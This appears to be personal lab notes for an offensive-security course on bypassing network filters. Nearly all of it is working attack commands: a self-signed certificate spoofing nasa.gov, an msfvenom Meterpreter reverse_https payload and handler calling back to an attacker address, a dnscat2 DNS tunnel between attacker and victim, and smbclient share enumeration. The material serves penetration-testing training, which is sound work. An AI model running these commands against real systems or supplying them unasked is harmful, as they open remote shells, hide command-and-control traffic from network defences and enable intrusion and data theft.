# Bypassing Network Filters
## 9.3.1.1 Exercises
```
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=UK/ST=London/L=London/O=Development/CN=nasa.gov" -keyout nasa.gov.key -out nasa.gov.crt
cat nasa.gov.key nasa.gov.crt > nasa.gov.pem
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.70 LPORT=443 PayloadUUIDTracking=true PayloadUUIDName=Whoamishell HandlerSSLCert=/home/osep/nasa.gov.pem StagerVerifySSLCert=true -f raw -o /var/www/html/shell
sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.49.70;set LPORT 443;set HandlerSSLCert /home/osep/nasa.gov.pem;set StagerVerifySSLCert true;exploit -j"
```
## dnscat
[Using SMBClient to Enumerate Shares (bestestredteam.com)](https://bestestredteam.com/2019/03/15/using-smbclient-to-enumerate-shares/)
```

Attacker:dnscat2-server tunnel.com 
Victim:dnscat2-v0.07-client-win32.exe --dns server=192.168.49.70,port=53 --secret=
```
### pratice
#### LIST SMB share
```
smbclient  -L \\\\127.0.0.1 -U offsec -p444 
```
#### Connect smb share
```
smbclient  \\\\127.0.0.1\\Users -U offsec -p 444

```
